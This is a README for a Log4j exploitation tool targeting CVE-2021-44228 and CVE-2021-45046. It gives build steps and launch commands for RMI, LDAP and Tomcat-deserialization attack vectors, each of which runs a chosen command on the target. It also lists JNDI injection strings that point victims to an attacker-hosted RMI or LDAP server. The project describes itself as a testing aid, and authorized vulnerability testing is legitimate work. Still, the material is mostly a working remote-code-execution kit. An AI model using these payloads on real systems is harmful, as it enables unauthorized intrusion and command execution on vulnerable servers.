# Log4j-JNDIServer

This project will help to test the Log4j CVE-2021-44228/CVE-2021-45046 vulnerabilities.

## Installation and Building

- Load the project on Intellij Idea
- Select JDK in "Projects Settings"
- Create the artifact in "Project Settings" -> Artifacts -> Create JAR from Modules -> In "JAR files from libraries" mark "extract to target JAR"
- Build Project (CTRL + F9). This will create the jar file in /out/artifacts/ folder

### Building with Maven

Requires Java 1.8+ and Maven 3.x+

- `mvn clean package -DskipTests`
- You will find the .jar file in /target folder

## Usages 

### 1.RMI Attack Vector

`java -jar Log4j-JNDIServer.jar 1 <RMI_IP> <RMI_PORT> <HTTP_PORT> <COMMAND>`

You don't need to host the Exploit.class anymore. The app will start an HTTP server on the indicated port.

You must indicate the command you want to run in the target.

`Injection: {jndi:rmi://<RMI_IP>:<RMI_PORT>/Foo}`

### 2.LDAP Attack Vector

`java -jar Log4j-JNDIServer.jar 2 <LDAP_IP> <LDAP_PORT> <HTTP_PORT> <COMMAND>`

You don't need to host the Exploit.class anymore. The app will start an HTTP server on the indicated port.

You must indicate the command you want to run in the target.

`Injection: {jndi:ldap://<LDAP_IP>:<LDAP_PORT>/Exploit}`

### 3.Deserialization Attack Vector (Using Tomcat payload)

`java -jar Log4j-JNDIServer.jar 3 <RMI_IP> <RMI_PORT> <COMMAND>`

`Injection: {jndi:rmi://<RMI_IP>:<RMI_PORT>/Foo}`

## Examples


